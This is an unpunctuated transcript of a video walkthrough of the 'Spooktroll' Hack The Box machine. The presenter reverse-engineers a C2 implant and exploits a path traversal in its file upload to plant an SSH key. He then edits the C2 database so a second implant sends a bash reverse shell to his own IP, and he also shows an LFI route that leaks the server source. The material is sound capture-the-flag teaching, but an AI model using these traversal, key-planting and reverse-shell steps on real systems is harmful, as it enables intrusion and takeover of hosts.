 what's going on youtube this is ipsec i can be doing spook troll from the uhc that's ultimate hacking championship october finals if you want to play this box it is playable over on hack the box and this box is all about attacking an unknown c2 server that created an python fast api and the implant is in c plus plus essentially you're supposed to run the implant discover how it talks to the c2 server enumerate functions and find out the file upload vulnerability is vulnerable to a path traversal which has plagued a lot of c2s in the past i want to say like cobalt strike was vulnerable to it covenant metasploit etc because all the c2 authors they put a lot of obfuscation and stuff within the implant and they just end up trusting the data the implant sends because like you don't know the encryption key authentication method etc so the file upload you can upload an ssh key ssh into the docker instance running the c2 and then from there take a look at the database and see that an implant is calling back on a different host so you edit the database to add a task for that implant to send your reverse shell to do the privacy so with all that being said let's jump in as always we start with the nmap so dash sc for default scripts sv enumerate versions 08 i'll put all formats put in the nmap directory and call it spook troll and then the ip address which is 10 129 96 42. this can take some time to run so i've already ran it looking at the results we have a few ports open the first one being ssh on port 22. it's banner tells us it's in ubuntu server then we also have http on port 80. it's been it tells us it's running uv icon or uv corn i don't know exactly what this is but i know it is a python technology so if i go to google it we can see it's a ultra fast asgi server implementation using uv loop and http tools and talked about python so we know it's probably a python application if you don't know what asgi is this is a synchronous server gateway interface very much like a web server gateway interface but it's built for speed because it threads a lot of things i believe but that's not really too important the important thing here is it's probably python so looking at these requests we have a request and we're getting not found we have one that gets a authentication cookie it looks like a method not allowed we have a robots.txt and it's giving us a path so we should definitely check that out and then we also have ssh listening on port 2 2 2. its banner also is identical saying it's an ubuntu server but if we look at the host key we can see this one begins with 1677. if i go to the top this one begins with ea84 so there's two different ssh servers listening here and generally this means you're looking at some type of router or firewall and it's doing network address translation also known as nat but in the case of ctfs generally it means you're going to be attacking some type of docker interface or some virtualization technology so just keep that in the back of your mind and we can go poke at the web server so 10 129 96 42 and we just get that cookie that says auth we can send this into our web developer tools look at all the headers but nmap didn't really tell us anything and this isn't telling us anything either that it probably just gives us some md5 some back but there was a robots.txt so let's go take this out take a look at this and it's disallowing us to download this file so let's try uh going there so 10 129 96 42 and we get a bunch of binary content it does say elf here so chances are this is going to be an elf binary but let's just download it to a box i'm going to use curl dash o i'm going to call it implant and if i do a file against implant we can see it is a 64-bit health so we could also ch mod plus x that file and what else could we do um there is a alternative path here if you fuzz this parameter it's actually lfi um at the end of the video we'll go exploit this piece because i think doing all the reverse engineering stuff is more fun but i want to leave a second piece because reverse engineering in a ctf is a very mean thing to do especially when it's timed so there was a quick like win if you abused this lfi and guessed it was python where you didn't have to guess because uv icon told you but we'll go into that route after we're done doing all this reverse engineering the easiest way to understand a file is just to run it generally not recommended always make sure you snapshot do this in some type of vm but we just run this application and we see it crashing it's crashing on this field which if we google this it's probably going to easily bring us that it's a json parsing library for c plus so we know the binary is probably written in c and it's giving a purse error so it did not get what i expected which was probably json so the very first thing i want to do is analyze exactly what this application is doing so i'm going to do pseudo wireshark and i'm going to look at ton0 we'll run this application again and we get nothing and that's because it's going to my dns server which isn't going through the vpn interface so let's change this to ev0 and then i'm going to filter dns request we will run it again and we can see it's reaching out to spooktroll.htb so we should create a dns entry to allow us to have that so v etsy host and we can say 10 129 96 42 spooktroll.htb save that and now when i run this binary again we get some output status 0 arg1 who am i id 6 result and target task 1 arg2 so not too much and after that we get null task zero and then it looks like it tells us no tasks and sleeps so let's take a look at the ton zero traffic now so if we start this up we can get rid of this dns filter and actually i'm going to restart it executing the program so we get the very beginning we can see it's doing a bunch of http traffic so if i follow the tcp stream we can see what it looks like anything in red is going to be the implant blue is the server so we make a get on slash the server responds with this off json which we end up using as a cookie and after we do a get on slash we do another get on slash saying the hostname is equal to parrot and that's the hostname of my box so if i just do a hostname it is parrot so we're telling the c2 or application or hostname's parrot giving the authentication cookie and now it responds with task zero after that we do a get on slash poll specifying again that auth cookie and the server comes back with us with saying probably arg1 is who am i we have id is seven i think id was five earlier so this looks like it is incrementing uh target this is probably gonna be like a session cookie for c2 task one so we don't know what that is and then we have arg2 and right after we get this this is what was printed to our screen we're doing a post request now interesting enough everything before has been a get and when putting id is equal to seven so it looks like we're giving the results of this unique tasking and the result was ipsec and that is if i run who am i what my actual user is and the server responds back with null and then we do a get on poll we can increment the stream by one and it just responds with task zero which we do nothing with and again we just keep going down we keep getting task zero so there's not too much we know here we could try playing with this so what i'd want to do is use burp suite we can set the proxy to bind to let's say port i guess 8081 and we will redirect everything to 10 129 96 42 on port 80. so now if i go to localhost 8081 it actually sends me to the c2 server so this becomes handy because it makes it super easy for us to man in the middle or binary so you can do pseudo vi etsy host and we change this to be 127.01 now the only thing we'll have to do because right now we still don't get to our server because burp suite was running as my user which means i couldn't bind to port 80. so i bound to port 8081 i'm gonna google socat redirect tcp port and we'll use socat to listen on port 80 and bend it over to 8081. so let's see we probably want reuse address here as well i'm not sure so i'm gonna go in my vpn tab i'm gonna do sudo this socat and we'll forward to 12701 8081 reuse addr i think this is correct so if i go to just localhost we get nothing it tries to go https localhost but nothing's there now i'm listening on this socap if i go to localhost hopefully i see authcookie i do so now we know this is working so what's happening is on port 12701 we're listening on 80 with socat we're forwarding it to 8081 which goes all the way to burp suite and then redirects it to the target it's a lot of redirects for this but generally the easiest way unless we're just running as root on so perhaps we could listen on port 80. so now when i run this implant we can see what happens in burp suite and this would let us edit things so if i wanted to x out we can go again forward forward on this poll we want to intercept the response and we could change the task so if i change this to task 4 let's just see what happens uh some type of error let's try that again we may have to be faster because i think there's a timeout in this intercept response task 4 forward and it still errors so i'm guessing it does not like that the other thing we could be doing see status we can search for this so options match and replace response body match that okay so let's see what happens when we just run this binary now turn intercept off and we just get a seg fault so we could change task 4 to be something else so if i edit this we could say task 0 and just see what happens prints no tasks right away so at this point we're relatively confused at the binary so might as well just open it up in geija but if you were like just doing dynamic analysis i would be spending more time in burp suite trying to figure out what it did and i'm confident if you spent enough time you would be able to figure out without jumping into um geeja and reversing the binary and again you don't even have to do any of this because there is a bypass with that lfi but i'm going to import the file we want to import implant let's see where are we we want spiritual where is it here we go okay and once this starts i'm going to pause the video because it may take a few minutes to analyze the binary so i'm just going to pause until this piece down here is done moving so now that guidra's done we can go over to the exports and we see there are a ton of exports here and that's because this is a static compiled binary but it is not stripped so you can just go to any function name i typed main so we can look at the main function and i also want to do window decompiler and main just calls one function that is spooky so i'm going to go into spooky and we see lots and lots of data now right off the bat it's doing a decrypt xor so this is probably interesting to me i'm going to let's see if we highlight this it's going to call so i'm going to copy this i'm going to run this in gdb so gdb dot slash implant and if we break oh that's not what i wanted b star like zero x zero zero 401 uh 40 2013. i don't need that two stars i'm pulling this address right here so we can run this and we broke on this call so i'm going to step in and then we can run finish and we get to the end of the call and on my rax register it should be the result of that and the result of that decrypt xor is uhc reverse engineering master so this was the very first flag in the application just looking at that decrypt function and pulling the result and the result will always be i believe in rax for 64-bit so after that where are we so we're around this part of the application if we keep scrolling down we can see right here it's doing get hostname we got a do loop see going to make this bigger here and we have a function perform get so this is probably an http get right here if we keep scrolling another loop while we have another get right here another get and eventually we get down here and there is a case statement so whenever you're dealing with like a c2 or something case statements are somewhat common and case zero we have no tasks so you could have also found this by just looking for the string and then find the cross reference and i said case statements are somewhat common in c2s because how it works is we have to give the agent some type of tasking right so if i go in my http history this poll this is the tasking thing and this case one it's executing who am i if we looked at case one we can see it's calling exec right here and i bet if we broke here we would see it calling a system with who am i we can go inside the exact function and let's see we have it p open right here so let's try breaking uh 4017c3 b star 0x4017c3 so let's control c let's just run it again this is the decrypt it's going to skip over that we did not break there info b 4017 z3 4017 c3 it's weird should have broke there let's go back and we can break here 402 8f9 402 8f9 so let's run let's see we're not hitting this oh i think that's because i'm going through brip suite and we're replacing task 1 with task 0. so if we run this again there we go so we hit that first break point 4 1 7 c 3 and we see the very first argument to be open is who am i so we have successfully broke there if you're confused that what happened was i had something in burp suite replacing task one with task zero so we never hit this we kept going down to this path so let's see info b we can delete two and delete three and we probably want to see what else there is so k zero is nothing case one we know is going to be um running a argument and if we look at this it's not the most pretty thing in the world but we can see this is pulling arg one and putting it somewhere so we can kind of read this to see oh arg1 and arg1 in our case was who am i right that was the command we ran so if we go down we do exact and then we do post because we're sending the result back to the server so case two let's see what this is doing um we're getting erg one org two so we have two arguments right now and then still doing something with erg one perform get and keep going down it looks like right here we're going to be uploading a or saving a file so arg2 is probably going to be save file we could go and burp and edit this json and see if it works that way but i'm not going to go into that right now case 3 we can see kind of what it's doing arg1 so it only uses erg1 and then eventually it calls perform upload if we look at perform upload we can see it assembling a string c u r l h this is cookie so you can see it assembling the string right here and if we ran the strings against this so if i just go um strings implant and grep dash i curl or well before i get curl because we have the um static compiled library let's see what would be unique in this string put let's see file upload so i'm going to do file underscore upload so if i grip this for file upload it's not a string and that's because this is built to like evade strings by just breaking the string up into much smaller pieces so if i look for let's say upload that's not it where are you let's just xxd grep it was u like that grip lo it's somewhere in this hex and the tricky thing is it can always wrap to this next line which breaks a lot of things so i'm going to grab for pl i'm going to do dash a1 and that's going to grab everything that has pl and then the next line so in case it does wrap we can now map this and i'm just going to grab for d and we can see right here is probably where it's starting to build that string so let's do xxd glass and looking at the string we can see it doing a curl or it's doing something but again this is pretty much what we saw in ghidra let's see where is it all these appends so we got file upload like this but the easiest thing to do would be just breaking on system because it looks like it's building the string it keeps appending to local 48 and then eventually it does system on local 48 so what i'm going to do is break at 410 e77 so let's go back in gdb and b star 0x 410 e77 info b to make sure i don't have any other break points we can run it and it's not going to do anything because we're not hitting that task remember like if we go into ghidra if we go back to what calls perform upload we have to be in case three so if we go back to burp suite actually let's do this without burp suite so what we could have done is went to options we can do them both i guess edit this and we can say this task is now task three and we start this up let's run the program again and now we broke and rdi which is the very first argument is the curl command so we can do x slash s rdi and we also get this and since it's going through um burp let's see let's turn proxy intercept on if we just continue it can't read local data from file application and that's because it's trying to read the file who am i right so what i'm going to do is go back in here and we can create a second thing so response body match will match who am i and replace it with etsy pass wd so now when we rerun this let's make sure we are intercepting run it should break on the curl let's see run oh we're breaking on everything right now let's turn the intercept off so now we're at curl turn it on continue and we sent passwd to our web our two burp suite if we send it we say see file upload successful file management file is equal to passwd so if i go to or not burp but go to my browser and request it we should eventually see let's see i'm not intercepting 10 129 was it 46 cat etsy host 129 96 42 if we go there we can see we do get the pass wd so we have a file upload vulnerability now the second way we could have got that if we did not have this whole burp suite thing let's turn these off if we look at this code we go near the top the switch statement we can break at 402 45c so b star 0x40245c going to info b we can delete four and then we run this application of course we're not intercepting let's run it again we break here it's jumping rax and if we look at rax it is pointed to 402 8b0 and if i go here we look at the switch statement case uh zero oh no we're at case one because it's still got a one let's see actually we can probably just copy this address hit g to go and paste and i think this is where it jumps yeah so 428b0 i'm highlighting it and we can see it goes right here in case one so what i'd want to do is look at this let me go all the way down case three so this is probably where we want to jump so 402460 so set rax is equal to 0x 402 460. i'm gonna put two zeros in front of it because i think that's how it was here right it had a lot let's just try this four two four six zero and if we do info r we can look at rex that's where it's pointed step and now we are here four six zero so we have successfully jumped into this if i break on this upload again let's see this is call 42b let's see 402 bfe forward to bfe continue and we have now broken on perform upload this way so you don't have to use burp suite you can always do it within um what is it a debugger but burp suite generally makes it easier what if i can now set rsi is equal to etsy let's do hostname because we already did pass wd once i want to say hostname exist it does so i wonder if i can't set that because it's too big or maybe i need single quotes oh it's probably because it's pointed to a address so that probably just broke the application let's see what it builds if i do this as we can probably find where it does system i thought we could have let's see we can just get system out of here so it's going here where is system 410 e77 continue and we did not hit it correctly but you know how to navigate through gdb and you also know how to navigate through burp suite and what we found was we could upload files now this file name is also potentially um lfiable or maybe it's not lfi path traversal so i'm going to do a bunch of dot slashes we're going to try root ssh authorized keys and what we're doing is we want to put a key file here so let's cat ssh uh we can just generate a new one actually sh key gen dash f spook troll cat spook troll dot pub we can put this key there send it and it says file upload successful select chmod 600 spook troll and try ssh again so sh dash i spook troll root at 10 129 uh what is it 96.42 and we don't get in but we can try port 222 that second ssh port and of course host key we have to clear try this again too many authentication failures i did not do port two two two two yes and now we are in the application so we could get user.txt which is just the flag but the key piece to do is do enumeration of this we can go into the c2 itself and if we look at the database so sqlite3 sqlapp.db we can do a dump and we see there's a bunch of things so i think we can do dot schema and we can see what tables there are so there's check-ins tasks and sessions so if i do select star from sessions we can see a bunch from parrot we have one from spooktroll so a different hostname if we do select stir from tasks we can see a bunch of tasks some running uh ipsec but this one is root so let's go back to check-ins real quick there are sessions and we can see the id matches i had put that on my clipboard just before so if i do select star from check-ins and we can say i think where session is equal to that does that work yep so this is the session with root and we can see every two minutes it is checking in so if i do select star from tasks we can see we have the incremental task id the session i don't know what these two are starting who am i and we have the result so what i want to do is let's see i wonder if i can do schema tasks like that so now it just says what each thing is so id target the status the task arg1 arg2 and result so i'm going to do a dot dump real quick to make this easy and we probably don't want check-ins if i can do dump tasks yep so what i did there is dot dump because they're going to give me this whole syntax so i'm going to insert something into tasks and i'm going to do the next id because it's incremental so the session i want to get the session that i don't know that's this guy this is root and hex i believe and then zero this is status and only things that have a result have a one here right look this doesn't have a result and that's zero the result zero so upon the post of it returning data status is one so this is like is the task done or not right so we want to leave that one uh all right we want to leave that zero we want to leave the task as one and we want to send a reverse shell so i'm going to do bash dash c dash dash i and we probably need double quotes here bash dash i dev tcp 10 10 14 8 9 000 one zero and one and we can see if this works so i'm going to nc lvmp 9001 insert that into tasks exit or control d to exit date and it runs every two minutes so it's going to run in about 90 seconds so we're going to pause the video and we'll see if we get a hit actually uh let's see sleep let's do 50. i want to make sure i'm recording when that finishes so i'm gonna pause the video and we'll see what happens the sleep command has finished if i do date we have about nine seconds left until the moment of truth if we get a shell uh five seconds left five four three two one and we have a shell and now we are root on the host operating system so if we do hostname here it's big troll hostname here it's spook2 so that is the box doing it the reverse engineering way let's take a step back and we'll do it through lfi so exiting everything and now let's go back to a browser so this is where the file was if we do a bunch of these dot slashes we can get to etsy passwd and this is the passwd on the box remember if we didn't put that we did upload our copy of it but these are step two very different passwd files so what i'm going to do is w fuzz this parameter so i'm going to do w fuzz dash u paste this and i'm going to fuzz for everything up one directory ending in dot pi i'm going to do the word list user share word list uh was it web content oh no um i want opt set list discovery web content rathsmallwords.txt and i think that may be it so i'm going to let this run and we want to hide everything with the code 500 because that's internal server error so what we're doing here is we're trying to go up one directory and find a python file the reason why we're trying to find a python file is because we know this is a python web app based upon its uv icon header and the reason why we go up one directory is because generally when you upload files it goes into a directory called like slash files so that's why we're going up one directory with this traversal so hopefully soon we get a hit of some python script that just exists on this server and here it is we have server so now if i do this curl so we could either curl it or we could access it this way so if i type server.pi we can download it or i can just do curl and paste this right now we can do make dirt web app go into web app do this curl and we get the python script so we can leak the source code so this is importing uv icon or uv corn i don't know exactly how to announce it and it's going into the app directory then it's loading the pi uh python script main.pi inside of app and executing the function app i believe so if i now change this lfi and we do app slash main dot pi we get a different script so i'm going to do that and we can actually make their app move main dot pi into it and if we really wanted to we could go and grab the other files so it looks like there's a database.pi based upon this from dot there's a models.pi and a crud.pi so if you really wanted to we could do this curl and do like database dot pi dash o database dot pi uh i think model.pio models probably models.pi yep and then crud.pie so if you did all this now you can probably execute the application i forget where server.pi was let's just re-download it and if i execute this with python uh we have something not implemented we want multi-part so what i'm going to do pip3 install python3 multi-part and this piece you don't actually have to do i'm just showing you oh yeah we leak source code we can actually download this python source code and then run it so if i go to localhost uh let's it's on eight thousand so localhost port 8000 we get a get here and it behaves just like the server did so at this point we have stolen the c2s source so let's go into app let's look at main.pi and see what this does so on a get to slash it's going to return a number divisible by 42 and there's some attempt to make it look like an md5 sum so if cookie is in request headers it's going to get the cookie and it does this because it's going to chop off auth equals and now it's converting it from hex into a decimal with this so int auth this is like that hex version that looks like md5 sum comma 16 base 16 which is hex so if we went in python 3 um let's do int 10 comma 16 or a comma 16 that's 10. if we do c it's 12 and that's because this is the hex representation of it so right now we're just checking if the authentication is divisible by 42 and if it includes hostname if it does then it's using this crud create user so it's creating a session the session local is a sqlite thing and then also going to create the task of one and executing who am i and then if that cookie does not exist then it's going to return a random digit that is divisible by 42 and looks like an md5 sum so robots this is just getting robots.txt telling you how to download the implant then we have slash poll this is uh polling for tasking so again checking if we are logged in and if we are then do a check-in and if you go to the crud file so let's go to a web app app v crud dot pi you can see all these are just functions around sql or well sql alchemy but the key thing you wanted to do is just look at file upload so based upon this we can see it's making a put request all the previous ones are get except one does have a post for the result but this is the http method so it's doing a put request to slash file upload making sure we have that auth header and that's going to attempt to make the directory files go into it and write that file so just based upon this you knew oh we could just use curl send a cookie um let's see if i can do this without cheating and looking at the source so curl dash h cookie 42 oh we can't do cookie 42 because that is not um hex i think it's what is 42 to hex um let's see cyber chef do two hex 42 that's not it we want from ent that's not what i want let's just do um decimal to x uh go to google this will be easier 42 is 2a so we want a cookie to be 2a so now we're divisible by 42 and then we want to do a put request so let's do curl put request and we will do dash capital x put okay and then where's file i wonder if we do dash f like that file is equal to etsy pass wd let's try that and then the host name so 10 129 cat etsy hosts 96.42 96 42 slash file underscore upload internal server error so we had screwed something up see we can cheat and see exactly what this is so if we go to gdb where's the curl run jump rax do we set that to be something there we go let's see break perform upload see okay and now we want to break on the system command so 410 e77 0x410e7 continue and then x slash s odi so what did we screw up we had that auth x put file is equal i don't know if we needed caps no file is lowercase i'm just going to copy this and we'll see oh stupid me auth is equal to 2i there we go so this is how we could have understood this file upload thing and they can just do p localhost 8080 to send it to brip suite i think it's dash p intercept on let's see is it dash dash proxy there we go and this is now from curl so we could again do the path traversal here and shell the box so that will mostly be the box i'm going to take a look at the c plus plus source code just so you can see kind of what that looks like and then we'll call it a video and here we have the source code of the implant and i'm not going to upload this to github i know a lot of you probably want the source to play around it but really this is absolutely god-awful coding standards i did this in like one afternoon and i pulled from a lot of various projects i had so organization and everything here is out the window the very first thing i'm doing is putting a bunch of data in this variable called flag and that's really just this xord with a capital q which is 81. we could validate that by going to like cyber chef so if i google cyber chef we go here and let's do from hex paste this and then xor this with a capital q utf-8 you get that string so this is just defining it early if we go into main that's where it's calling spooky and spooky here is setting this up now generally when i do any type of implant i like keeping an internal state structure and if i look at core.h generally not how i'd use it but this is where like your implants unique identifier would go if you do any like reflective loading of libraries you'd put like those here maybe some tokens a username password just like internal structure where you can query things easily i have this one called flag and that's where i'm putting that obfuscated variable so if i go back here we can see state.flag is equal to res which i have is like result and it's doing decrypt xor um flag so again all that's doing is running this decrypt xor which is xoring this string with a q and we can see it puts in that state if i look at where elsestate.flag is used let's see let's just copy this we can see it is used over here and if we had called task 4 it would append the domain auth first name callback period and flag and send that all to the c2 server uh we ended up getting the flag by just um setting a breakpoint on that xor so we set the breakpoint right here and generally when you return things you return on the rax register i believe so that's why we had saw it but that's how i handle that um the state.off i was really lazy when coding this um generally speaking i would just put the cookie here and when calling it i'd do this but in the sake of laziness i set state.auth is equal to this and then when we authenticate let's see i am just appending it so this state dot off variable eventually becomes auth is equal to uh something divisible by 42. ex uh was it 2c or something or 2a i forget exactly what it was but that's what that becomes uh hostname we're just getting the hostname of a box and then setting state.hostname again super lazy because um i'm lazy when i code and this was just a like um ctf challenge so i didn't have to be creative with how i did things but i penned it this way because later when i use this i'm just passing it as a piece of a curl so i didn't feel like dealing with it later so this eventually becomes like first name is equal to parrot i think in my demo our domain this is where we're calling the c2 so we set state.running to true and then if i ever set this to false later on that will kill my uh loot so that's generally how i stop now we're doing a prepare http if i look at this it's just preparing to use for a curl library so we're just initializing curl and what this is doing is it's just a way to clean up variables ideally this should all be done in separate functions but again i was lazy so i just did this quick hack so we do the first get inbound outbound data is currently blank we get the results and the results is going to be example auth 42 would be an example and of course it would have to be whatever hex is divisible by 42. we'll just say 2c i don't know if that's the case but that's how it returns probably actually like that so we process that and now if j contains auth which it does then we append the uh value to state.off and now that's where it becomes off equals something divisible by 42. so we do the next get and now state has state dot auth so if i looked in perform get of this http library i have let's do perform get we can see one of these options uh let's see right here if state.auth is greater than 5 then append it as a cookie and this may look confusing to you this is essentially how we do curls and c is we have this object that was set up by the prepared http the curl easy init and now we're just setting each option one at a time and then eventually we say go perform it so this is just like setting dash h cookie colon auth equals whatever so this is just how we set things so getting on slash and then we're appending state.hostname and remember state.hostname is going to be something like question mark hostname equals parrot so this is where we're appending our um variables and then inbound data is probably blank outbound data is going to be potentially a task if j contains task then exit or if j does not contain task then exit so that's saying oh um we attempted authenticate we did not get task 0 that's unexpected so now the c2 is going to exit at that case but we normally do get a task 0 so we're going to continue and we hit this loop which just does a get on slash poll and then prints the data here so that's why when we executed implant we saw it outputting the actual command and after that it will attempt to parse the outbound data and identify what to do if we go back to parrot let's see we get poll that's this so essentially it takes this variable this task equals one and uses that to identify what to do um case one we're going to look for arg one put arg one in cmd and then call exec on cmd here we're getting id out of this and this is the incremental id and then we send the post of result and this back to the server which lets it update its database to tell the result of this command so the main confusing thing i think a lot of people have is the difference between task and id task is the unique identifier for what type of task it is and id is going to be the unique identifier for that specific task so we perform that and it uploads case two we have download we kind of saw this it does the get on arg1 and then it's going to open a file at arg2 and write that file and then close and then case three this is our upload we look for arg one and it's going to execute perform upload and this is a really weird way to do it um i should have done upload kind of like how i did post and get with this curly curl easy set option but i had an issue with um setting like multi-part file and triggering the lfi so i decided to be really lazy and i just create a big string which is a curl command and then execute it with system the reason why i broke it up like this as we talked about a little bit earlier is the strings binary is only going to show you strings of like three or five characters or greater so because i'm putting it in such small strings where it's actually writing in the file is like um cu then a null byte to terminate it or l then a null byte then dash h bass like this and a null byte and because it has all these null bytes your strings just skips over it and you don't see one big long curl command that would be helpful so it just forces you to do light reversing and what we did was we set the breakpoint right here so we can see the value of command but yeah that is essentially the source code of this application there is the task 4 which i think we talked about where it just prints all its data and performs that post but yep hope you guys enjoyed that take care and i will see you all next week